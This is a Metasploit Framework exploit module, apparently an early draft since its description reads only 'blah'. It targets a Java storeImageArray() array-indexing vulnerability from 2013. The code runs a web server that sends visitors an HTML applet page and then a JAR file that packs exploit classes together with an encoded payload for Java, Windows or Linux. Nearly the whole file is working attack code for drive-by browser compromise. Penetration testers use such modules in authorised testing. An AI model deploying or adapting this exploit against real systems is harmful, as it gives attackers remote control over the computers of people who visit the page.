##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({ :javascript => false })

	def initialize( info = {} )
		super( update_info( info,
			'Name'          => 'Java storeImageArray() Invalid Array Indexing Vulnerability',
			'Description'   => %q{
				blah
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Unknown',  # From PacketStorm
					'sinn3r'
				],
			'References'    =>
				[
					[ 'EDB', '27526' ]
				],
			'Platform'      => [ 'java', 'win', 'linux' ],
			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
			'Targets'       =>
				[
					[ 'Generic (Java Payload)',
						{
							'Arch'     => ARCH_JAVA,
							'Platform' => 'java'
						}
					],
					[ 'Windows Universal',
						{
							'Arch'     => ARCH_X86,
							'Platform' => 'win'
						}
					],
					[ 'Linux x86',
						{
							'Arch'     => ARCH_X86,
							'Platform' => 'linux'
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 12 2013'
			))
	end

	def on_request_uri( cli, request )
		print_debug("Requesting: #{request.uri}")
		if request.uri !~ /\.jar$/i
			if not request.uri =~ /\/$/
				print_status("Sending redirect...")
				send_redirect(cli, "#{get_resource}/", '')
				return
			end

			print_status("Sending HTML...")
			send_response_html(cli, generate_html(get_resource), {'Content-Type'=>'text/html'})
			return
		end

		print_status("Sending .jar file...")
		send_response(cli, generate_jar(cli), {'Content-Type'=>'application/java-archive'})

		handler( cli )
	end

	def generate_html(source)
		jar_name = "Exploit"
		html = %Q|<html>
		<head>
		</head>
		<body>
		<applet archive="#{jar_name}.jar" code="Exploit" width="10" height="10">
		</applet>
		</body>
		</html>
		|
		html = html.gsub(/^\t\t/, '')
		return html
	end

	def generate_jar(cli)
		paths = [
			[ "Exploit.class" ],
			[ "Exploit$MyColorModel.class" ],
			[ "Exploit$MyColorSpace.class" ]
		]

		p = regenerate_payload(cli)
		jar  = p.encoded_jar

		paths.each do |path|
			1.upto(path.length - 1) do |idx|
				full = path[0,idx].join("/") + "/"
				if !(jar.entries.map{|e|e.name}.include?(full))
					print_debug("Adding file: #{full}")
					jar.add_file(full, '')
				end
			end
			fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "jre17u24", path ), "rb")
			data = fd.read(fd.stat.size)
			print_debug("Adding file: #{path.join('/')}")
			jar.add_file(path.join("/"), data)
			fd.close
		end

		return jar.pack
	end

end